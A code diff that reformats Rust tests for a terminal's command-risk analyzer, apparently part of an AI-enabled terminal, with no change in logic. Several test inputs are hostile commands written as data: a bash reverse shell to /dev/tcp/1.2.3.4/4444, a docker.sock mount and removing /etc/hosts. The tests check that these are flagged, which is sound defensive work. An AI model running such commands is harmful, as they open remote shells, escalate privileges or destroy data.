@@ -88,7 +88,10 @@ fn paste_gating_warning_requires_confirmation() {
     let risk = lens.analyze_paste_content(paste);
     assert!(risk.is_some(), "Expected a risk for risky paste pattern");
     let risk = risk.unwrap();
-    assert!(matches!(risk.level, RiskLevel::Warning | RiskLevel::Critical));
+    assert!(matches!(
+        risk.level,
+        RiskLevel::Warning | RiskLevel::Critical
+    ));
 }
 
 #[test]
@@ -128,7 +131,8 @@ fn rate_limit_exceeded_after_threshold() {
 #[test]
 fn docker_sock_mount_is_warning() {
     let mut lens = SecurityLens::new(default_policy());
-    let risk = lens.analyze_command("docker run -v /var/run/docker.sock:/var/run/docker.sock alpine:latest");
+    let risk = lens
+        .analyze_command("docker run -v /var/run/docker.sock:/var/run/docker.sock alpine:latest");
     assert_eq!(risk.level, RiskLevel::Warning);
     #[cfg(feature = "security-lens")]
     assert!(risk
@@ -160,13 +164,16 @@ fn disk_overwrite_dd_is_critical() {
 fn reverse_shell_bash_tcp_is_warning() {
     let mut lens = SecurityLens::new(default_policy());
     let risk = lens.analyze_command("bash -i >& /dev/tcp/1.2.3.4/4444 0>&1");
-    assert!(matches!(risk.level, RiskLevel::Warning | RiskLevel::Critical));
+    assert!(matches!(
+        risk.level,
+        RiskLevel::Warning | RiskLevel::Critical
+    ));
 }
 
 #[test]
 fn context_sensitive_directory_upgrades_risk() {
-    use std::path::PathBuf;
     use openagent_terminal_core::tty::pty_manager::{PtyAiContext, ShellKind};
+    use std::path::PathBuf;
 
     let mut lens = SecurityLens::new(default_policy());
 
@@ -179,7 +186,10 @@ fn context_sensitive_directory_upgrades_risk() {
 
     // A simple rm becomes more risky in /etc
     let risk = lens.analyze_command_with_context("rm hosts", Some(&ctx));
-    assert!(matches!(risk.level, RiskLevel::Warning | RiskLevel::Caution));
+    assert!(matches!(
+        risk.level,
+        RiskLevel::Warning | RiskLevel::Caution
+    ));
     #[cfg(feature = "security-lens")]
     assert!(risk
         .factors
